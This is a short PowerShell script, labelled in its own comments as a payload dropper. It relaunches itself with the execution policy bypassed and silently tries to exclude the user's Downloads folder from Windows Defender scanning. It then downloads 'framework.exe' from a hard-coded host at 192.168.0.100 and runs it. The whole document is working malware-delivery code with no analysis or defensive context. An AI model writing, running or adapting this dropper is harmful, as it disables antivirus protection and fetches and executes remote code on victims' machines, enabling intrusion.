function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
    }
}

Ensure-WindowsPowerShell

try {
    # Attempt Defender Exclusion (will fail silently if not admin)
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue

    # === Payload download and execution ===
    $url = "http://192.168.0.100/framework.exe"
    $outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'framework.exe')

    Start-Sleep -Milliseconds 100

    Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing

    Start-Process -FilePath $outputFile
}
catch {
    Write-Error "Execution failed: $_"
}
